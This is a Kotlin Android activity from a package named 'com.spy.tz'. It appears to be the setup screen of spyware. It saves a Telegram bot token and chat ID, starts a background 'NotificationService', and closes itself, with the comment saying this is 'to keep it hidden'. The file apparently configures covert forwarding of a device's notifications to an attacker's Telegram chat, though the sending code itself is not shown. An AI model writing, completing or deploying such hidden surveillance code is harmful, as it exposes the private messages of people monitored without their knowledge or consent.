package com.spy.tz

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private lateinit var etBotToken: EditText
    private lateinit var etChatId: EditText
    private lateinit var btnSave: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etBotToken = findViewById(R.id.etBotToken)
        etChatId = findViewById(R.id.etChatId)
        btnSave = findViewById(R.id.btnSave)

        // Load saved data if exists
        val prefs = getSharedPreferences("Settings", MODE_PRIVATE)
        etBotToken.setText(prefs.getString("bot_token", ""))
        etChatId.setText(prefs.getString("chat_id", ""))

        btnSave.setOnClickListener {
            val token = etBotToken.text.toString()
            val chatId = etChatId.text.toString()
            
            if(token.isNotEmpty() && chatId.isNotEmpty()) {
                prefs.edit().putString("bot_token", token).apply()
                prefs.edit().putString("chat_id", chatId).apply()
                
                Toast.makeText(this, "Settings Saved!", Toast.LENGTH_SHORT).show()
                
                // Start the background service
                startService(android.content.Intent(this, NotificationService::class.java))
                finish() // Close activity to keep it hidden
            } else {
                Toast.makeText(this, "Please fill both fields", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
